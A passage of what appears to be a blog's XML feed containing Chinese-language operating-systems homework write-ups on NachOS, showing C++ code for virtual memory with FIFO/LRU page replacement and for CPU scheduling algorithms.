href="https://hackfun.org/2017/01/12/CTF%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">CTF中图片隐藏文件分离方法总结</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
      <tag>stego</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSIE--NachOS-HW3</title>
    <link href="/2019/12/09/2019-12-09-OS-HW3-2019/"/>
    <url>/2019/12/09/2019-12-09-OS-HW3-2019/</url>
    
    <content type="html"><![CDATA[<p>好難……嗚嗚嗚QQ</p><h1 id="作業要求"><a href="#作業要求" class="headerlink" title="作業要求"></a>作業要求</h1><ul><li>實現 virtual memory 並可以處理 page fault</li><li>實作 Page Replacement Algorithm 的 FIFO 與 LRU<ul><li>First in First out Page Replacement(FIFO)</li><li>Least Recently Used Page Replacement(LRU)</li></ul></li></ul><h1 id="Virtual-Memory"><a href="#Virtual-Memory" class="headerlink" title="Virtual Memory"></a>Virtual Memory</h1><p>為了實作 virtual memory 的部分，把前面原本 multiprogramming 的地方修改了<br>先在 &#x2F;code&#x2F;userprog&#x2F;userkernel.h 中加上輔助用的記憶體</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProgKernel</span> : <span class="hljs-keyword">public</span> ThreadedKernel &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 利用 SynchDisk 作為輔助記憶體</span><br>    SynchDisk *virtualMemoryDisk;<br></code></pre></td></tr></table></figure><p>還有 &#x2F;code&#x2F;userprog&#x2F;userkernel.cc</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">UserProgKernel::Initialize</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ThreadedKernel::<span class="hljs-built_in">Initialize</span>();<span class="hljs-comment">// init multithreading</span><br><br>    machine = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Machine</span>(debugUserProg);<br>    fileSystem = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FileSystem</span>();<br><span class="hljs-comment">// 加上這一行增加輔助記憶體</span><br>    virtualMemoryDisk = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SynchDisk</span>(<span class="hljs-string">&quot;Virtual Memory&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> FILESYS</span><br>    synchDisk = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SynchDisk</span>(<span class="hljs-string">&quot;New SynchDisk&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// FILESYS</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>在 &#x2F;code&#x2F;machine&#x2F;machine.h 中加上會使用到的變數</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Machine</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">bool</span> usedPhyPage[NumPhysPages];<span class="hljs-comment">// 紀錄那些 physical memory 已經被使用了</span><br>    <span class="hljs-type">bool</span> usedvirPage[NumPhysPages];<span class="hljs-comment">// 記錄那些 virtual memory 已經被使用了</span><br>    <span class="hljs-type">int</span>  ID_num;<span class="hljs-comment">// 每個 thread 都有一個專屬 ID_num 作為識別用的</span><br>    <span class="hljs-type">int</span> PhyPageName[NumPhysPages];<br>    <span class="hljs-type">int</span> count[NumPhysPages];<span class="hljs-comment">// LRU 用的 counter</span><br><br>    TranslationEntry *main_tab[NumPhysPages];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> fifo;<br></code></pre></td></tr></table></figure><p>宣告必要參數<br>&#x2F;code&#x2F;userprog&#x2F;addrspace.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AddrSpace</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-type">int</span> ID;       <span class="hljs-comment">// 存他 thread 的 id</span><br>    <span class="hljs-keyword">private</span>:<br>        <span class="hljs-type">bool</span> pageTableLoaded;<br>&#125;<br></code></pre></td></tr></table></figure><p>許多調整都在此處，這裡負責 load 程式碼到 memory 裡面，所以相當重要。<br>我在這裡開一個專屬這個 thread 的 page table，在 load 時一直往下找記憶體直到找到沒被用到的或是到底為止，以此來判斷 memory 夠不夠用，若不夠就需要用到輔助記憶體，需要存好一些重要參數以便要用的時候找得到。</p><p>&#x2F;code&#x2F;userprog&#x2F;addrspace.cc<br>後來覺得這段很醜所以就不放過來了，留在<a href="https://github.com/wiiwu959/NachOS">github</a>裡面了。</p><h1 id="Page-Replacement"><a href="#Page-Replacement" class="headerlink" title="Page Replacement"></a>Page Replacement</h1><p>宣告參數<br>&#x2F;code&#x2F;machine&#x2F;tranlate.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TranslationEntry</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> count;    <span class="hljs-comment">//for LRU</span><br>    <span class="hljs-type">int</span> ID;<br>&#125;;<br></code></pre></td></tr></table></figure><p>主要都是改 <code>else if (!pageTable[vpn].valid)</code> 裡面的東西，FIFO 就是一直照順序當 victim，<br>LRU 則是用一個 count 來計被用到的次數，每次把次數最少的換掉。<br>找完 victim 之後再去做 swap in swap out 的動作。<br>&#x2F;code&#x2F;machine&#x2F;tranlate.cc</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!pageTable[vpn].valid) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;page fault\n&quot;</span>);<br>kernel-&gt;stats-&gt;numPageFaults++;<br>j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(kernel-&gt;machine-&gt;usedPhyPage[j] != <span class="hljs-literal">false</span> &amp;&amp; j &lt; NumPhysPages)&#123; j++; &#125;<br><span class="hljs-keyword">if</span> (j &lt; NumPhysPages) &#123;<br><span class="hljs-type">char</span> *buffer;<br>buffer = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[PageSize]; <br>kernel-&gt;machine-&gt;usedPhyPage[j] = <span class="hljs-literal">true</span>;<br>kernel-&gt;machine-&gt;PhyPageName[j] = pageTable[vpn].ID;<br><br>kernel-&gt;machine-&gt;main_tab[j] = &amp;pageTable[vpn];<br>pageTable[vpn].physicalPage = j;<br>pageTable[vpn].valid = <span class="hljs-literal">true</span>;<br>pageTable[vpn].count++; <span class="hljs-comment">//for LRU</span><br><br>kernel-&gt;virtualMemoryDisk-&gt;<span class="hljs-built_in">ReadSector</span>(pageTable[vpn].virtualPage, buffer);<br><span class="hljs-built_in">bcopy</span>(buffer, &amp;mainMemory[j * PageSize], PageSize);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">char</span> *buffer1;<br>buffer1 = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[PageSize];<br><span class="hljs-type">char</span> *buffer2;<br>buffer2 = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[PageSize];<br><br><span class="hljs-comment">//FIFO</span><br><span class="hljs-keyword">if</span> (kernel-&gt;vmtype == <span class="hljs-number">0</span>)&#123;<br>victim = fifo % <span class="hljs-number">32</span>; <span class="hljs-comment">// 32 is NumPhysPages</span><br>&#125;<br><br><span class="hljs-comment">//LRU</span><br><span class="hljs-keyword">if</span> (kernel-&gt;vmtype == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-type">int</span> min = pageTable[<span class="hljs-number">0</span>].count;<br>victim = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)&#123;<br><span class="hljs-comment">//printf(&quot;%d&quot;,pageTable[i].count);</span><br><span class="hljs-keyword">if</span>(min &gt; pageTable[i].count)&#123;<br>min = pageTable[i].count;<br>victim = i;<br>&#125;<br>&#125; <br>pageTable[victim].count++;  <br>&#125;<br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;page %d swapped\n&quot;</span>,victim);<br><br><span class="hljs-comment">// 把東西存到 disk 裡面</span><br><span class="hljs-built_in">bcopy</span>(&amp;mainMemory[victim * PageSize], buffer1, PageSize);<br>kernel-&gt;virtualMemoryDisk-&gt;<span class="hljs-built_in">ReadSector</span>(pageTable[vpn].virtualPage, buffer2);<br><span class="hljs-built_in">bcopy</span>(buffer2, &amp;mainMemory[victim*PageSize], PageSize);<br>kernel-&gt;virtualMemoryDisk-&gt;<span class="hljs-built_in">WriteSector</span>(pageTable[vpn].virtualPage, buffer1);<br><br>main_tab[victim]-&gt;virtualPag e= pageTable[vpn].virtualPage;<br>main_tab[victim]-&gt;valid = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// 把東西 load 到 main memory 中</span><br>pageTable[vpn].valid = <span class="hljs-literal">true</span>;<br>pageTable[vpn].physicalPage = victim;<br>kernel-&gt;machine-&gt;PhyPageName[victim] = pageTable[vpn].ID;<br>main_tab[victim] = &amp;pageTable[vpn];<br>fifo ++;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>有特別在 &#x2F;code&#x2F;userprog&#x2F;userkernel.cc 加上一些參數調整讓他可以用參數切換，所以只要使用 -LRU 或 -FIFO 就可以選擇要使用的方法了。<br>Default 是設定使用 FIFO。</p><h1 id="結果"><a href="#結果" class="headerlink" title="結果"></a>結果</h1><p>直接用了 test1 test2 各兩個去測試</p><ul><li>Page fault<br><img src="https://i.imgur.com/NMi51fN.jpg"></li><li>FIFO<br><img src="https://i.imgur.com/w1CxCjh.jpg"></li><li>LRU<br><img src="https://i.imgur.com/rUWcIlS.jpg"></li></ul>]]></content>
    
    
    <categories>
      
      <category>homework</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSIE--NachOS-HW2</title>
    <link href="/2019/10/29/2019-10-29-OS_HW2-2019/"/>
    <url>/2019/10/29/2019-10-29-OS_HW2-2019/</url>
    
    <content type="html"><![CDATA[<p>這次的作業是要求讓 NachOS 能實現 multi-programming，還有完成</p><ul><li>先進先出排程 (First-Come-First-Service, FCFS)</li><li>最短工作優先排程 (Shortest-Job-First, SJF)</li><li>最短剩餘時間排程 (shortest remaining time first ,SRTF)</li></ul><p>multi-programming 上次測試 Sleep 時遇到記憶體互相覆蓋的問題以後就已經改好了，所以賺到 XD，這次作業主要就是實現以上的那些排程法。</p><h1 id="SelfTest"><a href="#SelfTest" class="headerlink" title="SelfTest"></a>SelfTest</h1><p>在作業說明中就有提到很多 class 裡面都有這個東西，可以讓我們不用利用 &#x2F;test 底下的程式來測我們的成果，而且助教也有在 github 上更新了一部分的 code</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++">/code/threads/thread.cc<br><br>...<br><br><span class="hljs-comment">// 印出現在正在跑的 thread 的 [Name: BurstTime]</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">SimpleThread</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Thread *thread = kernel-&gt;currentThread;<br>    <span class="hljs-keyword">while</span> (thread-&gt;<span class="hljs-built_in">getBurstTime</span>() &gt; <span class="hljs-number">0</span>) &#123;<br>        thread-&gt;<span class="hljs-built_in">setBurstTime</span>(thread-&gt;<span class="hljs-built_in">getBurstTime</span>() - <span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: %d\n&quot;</span>, kernel-&gt;currentThread-&gt;<span class="hljs-built_in">getName</span>(), <br>                kernel-&gt;currentThread-&gt;<span class="hljs-built_in">getBurstTime</span>());<br>        kernel-&gt;interrupt-&gt;<span class="hljs-built_in">OneTick</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 會初始化 thread 的資訊，然後還會 Call 到 SimpleThread()</span><br><span class="hljs-function"><span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">Thread::SelfTest</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">DEBUG</span>(dbgThread, <span class="hljs-string">&quot;Entering Thread::SelfTest&quot;</span>);<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> number     = <span class="hljs-number">3</span>;<br>    <span class="hljs-type">char</span> *name[number]   = &#123;<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>&#125;;<br>    <span class="hljs-type">int</span> burst[number]    = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-type">int</span> priority[number] = &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>&#125;;<br>    <span class="hljs-type">int</span> arrive[number] = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>&#125;;<br><br>    Thread *t;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; number; i ++) &#123;<br>        t = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Thread</span>(name[i]);<br>        t-&gt;<span class="hljs-built_in">setPriority</span>(priority[i]);<br>        t-&gt;<span class="hljs-built_in">setBurstTime</span>(burst[i]);<br>        t-&gt;<span class="hljs-built_in">Fork</span>((VoidFunctionPtr) SimpleThread, (<span class="hljs-type">void</span> *)<span class="hljs-literal">NULL</span>);<br>        <span class="hljs-comment">// SRTF 的部分，直接把還沒 arrive 的 thread 丟去 sleep 直到他 arrive 的時間到</span><br>        <span class="hljs-keyword">if</span>(kernel-&gt;scheduler-&gt;<span class="hljs-built_in">getSchedulerType</span>() == SRTF)&#123;<br>            kernel-&gt;alarm-&gt;sleepList.<span class="hljs-built_in">PutToSleep</span>(t,arrive[i]);<br>        &#125;<br>    &#125;<br>    kernel-&gt;currentThread-&gt;<span class="hljs-built_in">Yield</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>在 h 檔裡面也要加上我們用到的那幾個 function</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++">/code/threads/thread.<span class="hljs-function">h</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CheckOverflow</span><span class="hljs-params">()</span></span>;   <span class="hljs-comment">// Check if thread stack has overflowed</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setStatus</span><span class="hljs-params">(ThreadStatus st)</span> </span>&#123; status = st; &#125;<br><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> (name); &#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">()</span> </span>&#123; cout &lt;&lt; name; &#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SelfTest</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">// test whether thread impl is working</span><br><br><span class="hljs-comment">// 加上下面四個</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setBurstTime</span><span class="hljs-params">(<span class="hljs-type">int</span> t)</span></span>&#123;burstTime = t;&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getBurstTime</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> burstTime;&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setPriority</span><span class="hljs-params">(<span class="hljs-type">int</span> t)</span></span>&#123;priority = t;&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getPriority</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> priority;&#125;<br><br>...<br><br>ThreadStatus status;<span class="hljs-comment">// ready, running or blocked</span><br><span class="hljs-type">char</span>* name;<br><br><span class="hljs-comment">// 加上這兩個</span><br><span class="hljs-type">int</span> burstTime;<br><span class="hljs-type">int</span> priority;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">StackAllocate</span><span class="hljs-params">(VoidFunctionPtr func, <span class="hljs-type">void</span> *arg)</span></span>;<br></code></pre></td></tr></table></figure><p>看網路上也有做法是另外寫一個 function，再到 &#x2F;code&#x2F;threads&#x2F;kernel.cc 裡頭的 SelfTest 裡面加上執行這個 function，不過是一樣的意思。<br><a href="https://morris821028.github.io/2014/05/30/lesson/hw-nachos4-2/#%E7%AC%AC%E4%B8%80%E6%AD%A5-%E6%B8%AC%E8%A9%A6">Morris’ blog</a>就是用這個做法。</p><p>完成之後，就能直接在 &#x2F;code&#x2F;threads 資料夾裡面下 <code>./nachos</code><br>就會跑 SelfTest 裡面的東西了。</p><p>接著還做了這一段好讓我們可以選擇使用的方法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++">/code/threads/kernel.<span class="hljs-function">cc</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">ThreadedKernel::ThreadedKernel</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    randomSlice = FALSE; <br>    <span class="hljs-comment">// 加這一行</span><br>    type = RR;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; argc; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;-rs&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>     <span class="hljs-built_in">ASSERT</span>(i + <span class="hljs-number">1</span> &lt; argc);<br>    <span class="hljs-built_in">RandomInit</span>(<span class="hljs-built_in">atoi</span>(argv[i + <span class="hljs-number">1</span>]));<span class="hljs-comment">// initialize pseudo-random</span><br>                  <span class="hljs-comment">// number generator</span><br>    randomSlice = TRUE;<br>    i++;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;-u&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;Partial usage: nachos [-rs randomSeed]\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">////// 加上這一段，讀參數用的 ////////////</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;RR&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            type = RR;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;FCFS&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            type = FIFO;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;PRIORITY&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            type = Priority;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;SJF&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            type = SJF;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;SRTF&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            type = SRTF;<br>        &#125;<br>    <span class="hljs-comment">////////////////////////////////////////</span><br>    &#125;<br>&#125;<br><br>...<br><br><span class="hljs-function"><span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">ThreadedKernel::Initialize</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    stats = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Statistics</span>();<span class="hljs-comment">// collect statistics</span><br>    interrupt = <span class="hljs-keyword">new</span> Interrupt;<span class="hljs-comment">// start up interrupt handling</span><br><br>    <span class="hljs-comment">// 這裡這建構子加上type參數</span><br>    scheduler = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Scheduler</span>(type);<span class="hljs-comment">// initialize the ready queue</span><br>    alarm = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Alarm</span>(randomSlice);<span class="hljs-comment">// start up time slicing</span><br>    ...<br></code></pre></td></tr></table></figure><p>在 .h 檔</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">/code/threads/kernel.h<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">bool</span> randomSlice;<span class="hljs-comment">// enable pseudo-random time slicing</span><br>    <span class="hljs-comment">// 加上</span><br>    SchedulerType type;<br></code></pre></td></tr></table></figure><p>這樣就可以利用多一個參數來決定要用的 schedule 方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./nachos RR<br>$ ./nachos FCFS<br>$ ./nachos PRIORITY<br>$ ./nachos SJF<br>$ ./nachos SRTF<br></code></pre></td></tr></table></figure><p>接著就可以來實際做我們要實作的那幾個東東了~</p><h1 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h1><p>先修改該修的 .h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++">/code/threads/scheduler.h<br><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">SchedulerType</span> &#123;<br>    RR,     <span class="hljs-comment">// Round Robin</span><br>    SJF,<br>    Priority,<br>    FIFO,<br>    SRTF<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Scheduler</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Scheduler</span>();        <span class="hljs-comment">// Initialize list of ready threads </span><br><span class="hljs-built_in">Scheduler</span>(SchedulerType type); <span class="hljs-comment">// 這個要改，加上參數</span><br>~<span class="hljs-built_in">Scheduler</span>();<span class="hljs-comment">// De-allocate ready list</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ReadyToRun</span><span class="hljs-params">(Thread* thread)</span></span>;<br>                <span class="hljs-comment">// Thread can be dispatched.</span><br><span class="hljs-function">Thread* <span class="hljs-title">FindNextToRun</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">// Dequeue first thread on the ready </span><br>            <span class="hljs-comment">// list, if any, and return thread.</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Run</span><span class="hljs-params">(Thread* nextThread, <span class="hljs-type">bool</span> finishing)</span></span>;<br>            <span class="hljs-comment">// Cause nextThread to start running</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CheckToBeDestroyed</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">// Check if thread that had been</span><br>            <span class="hljs-comment">// running needs to be deleted</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">()</span></span>;    <span class="hljs-comment">// Print contents of ready 